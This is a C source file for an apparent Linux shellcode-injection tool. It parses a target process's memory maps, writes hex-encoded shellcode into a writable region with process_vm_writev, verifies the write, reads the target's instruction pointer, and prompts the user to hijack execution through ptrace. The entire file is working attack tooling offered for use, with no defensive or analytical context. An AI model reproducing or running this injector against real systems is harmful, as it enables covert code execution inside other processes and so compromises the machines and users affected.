#define _GNU_SOURCE
#include <sys/uio.h>
#include <sys/syscall.h>
#include <sys/ptrace.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>

static ssize_t vm_write(pid_t pid, uint64_t dst, const void *src, size_t n)
{
    struct iovec local  = { .iov_base = (void *)src, .iov_len = n };
    struct iovec remote = { .iov_base = (void *)(uintptr_t)dst, .iov_len = n };

    return (ssize_t)syscall(SYS_process_vm_writev, pid, &local, 1UL, &remote, 1UL, 0UL);
}

static ssize_t vm_read(pid_t pid, uint64_t src, void *dst, size_t n)
{
    struct iovec local  = { .iov_base = dst, .iov_len = n };
    struct iovec remote = { .iov_base = (void *)(uintptr_t)src, .iov_len = n };
    return (ssize_t)syscall(SYS_process_vm_readv, pid, &local, 1UL, &remote, 1UL, 0UL);
}

static int hex_decode(const char *s, uint8_t *out, size_t max)
{
    size_t n = strlen(s);
    if (n % 2 || n / 2 > max) return -1;
    for (size_t i = 0; i < n / 2; i++) {
        char b[3] = { s[i*2], s[i*2+1], '\0' };
        out[i] = (uint8_t)strtoul(b, NULL, 16);
    }
    return (int)(n / 2);
}

static uint64_t find_mapping(pid_t pid, const char *perms, size_t min_size,
                              uint64_t *size_out)
{
    char path[64];
    snprintf(path, sizeof(path), "/proc/%d/maps", pid);
    FILE *f = fopen(path, "r");
    if (!f) { perror("fopen maps"); return 0; }

    char line[512];
    while (fgets(line, sizeof(line), f)) {
        uint64_t start, end; char p[8]; char name[256] = "";
        if (sscanf(line, "%lx-%lx %4s %*s %*s %*s %255s",
                   &start, &end, p, name) < 3) continue;
        if (strncmp(p, perms, strlen(perms)) != 0) continue;
        if (name[0] == '[') continue;
        if (end - start < min_size) continue;
        fclose(f);
        if (size_out) *size_out = end - start;
        return start;
    }
    fclose(f); return 0;
}

static void list_mappings(pid_t pid)
{
    char path[64];
    snprintf(path, sizeof(path), "/proc/%d/maps", pid);
    FILE *f = fopen(path, "r");
    if (!f) { perror("fopen"); return; }
    printf("%-28s %-6s %s\n", "ADDRESS RANGE", "PERMS", "PATH");
    char line[512];
    while (fgets(line, sizeof(line), f))
        printf("  %s", line);
    fclose(f);
}

static uint64_t get_rip(pid_t pid)
{
    char path[64], buf[256] = {};
    snprintf(path, sizeof(path), "/proc/%d/syscall", pid);
    int fd = open(path, O_RDONLY);
    if (fd < 0) return 0;
    read(fd, buf, sizeof(buf) - 1); close(fd);

    uint64_t nr, rip = 0, rsp = 0;
    if (sscanf(buf, "%lu %*s %*s %*s %*s %*s %*s %lu %lu", &nr, &rip, &rsp) < 3)
        sscanf(buf, "%*s %lu", &rip);
    return rip;
}

int main(int argc, char *argv[])
{
    if (argc < 2) {
        fprintf(stderr, "usage: %s [args]\n", argv[0]);
        return 1;
    }

    pid_t pid = (pid_t)atoi(argv[1]);

    if (argc >= 3 && strcmp(argv[2], "--find-rwx") == 0) {
        printf("[*] maps for pid=%d:\n", pid);
        list_mappings(pid);
        return 0;
    }

    if (argc < 3) {
        fprintf(stderr, "[-] missing shellcode hex\n"); return 1;
    }

    uint8_t sc[4096]; int sc_len;
    if ((sc_len = hex_decode(argv[2], sc, sizeof(sc))) < 0) {
        fprintf(stderr, "[-] bad hex\n"); return 1;
    }

    printf("[*] target pid=%d  sc=%d bytes\n", pid, sc_len);

    {
        char status_path[64], line[256];
        snprintf(status_path, sizeof(status_path), "/proc/%d/status", pid);
        FILE *f = fopen(status_path, "r");
        if (f) {
            while (fgets(line, sizeof(line), f)) {
                if (strncmp(line, "TracerPid:", 10) == 0)
                    printf("[*] %s", line);
            }
            fclose(f);
        }
    }

    uint64_t map_sz = 0;
    uint64_t rw_addr = find_mapping(pid, "rw-", (size_t)sc_len, &map_sz);
    if (!rw_addr) {
        fprintf(stderr, "[-] no anonymous rw- mapping found\n");
        return 1;
    }
    printf("[*] rw- mapping @ 0x%lx  size=%lu\n", rw_addr, map_sz);

    ssize_t n = vm_write(pid, rw_addr, sc, (size_t)sc_len);
    if (n < 0) {
        fprintf(stderr, "[-] process_vm_writev: %s\n", strerror(errno));
        fprintf(stderr, "    (uid mismatch? dumpable=0? /proc/sys/kernel/yama/ptrace_scope?)\n");
        return 1;
    }
    printf("[+] %zd bytes written to pid=%d @ 0x%lx\n", n, pid, rw_addr);

    uint8_t verify[16] = {};
    if (vm_read(pid, rw_addr, verify, (size_t)(sc_len < 16 ? sc_len : 16)) > 0) {
        printf("[*] verify: ");
        for (int i = 0; i < (sc_len < 16 ? sc_len : 16); i++)
            printf("%02x", verify[i]);
        printf(" %s\n", memcmp(verify, sc, (size_t)(sc_len < 16 ? sc_len : 16)) == 0
                         ? "(ok)" : "(MISMATCH!)");
    }

    uint64_t rip = get_rip(pid);
    if (rip) printf("[*] target RIP: 0x%lx\n", rip);

    printf("\n[*] shellcode at 0x%lx - redirect execution via ptrace SETREGS or other means\n",
           rw_addr);
    return 0;
}
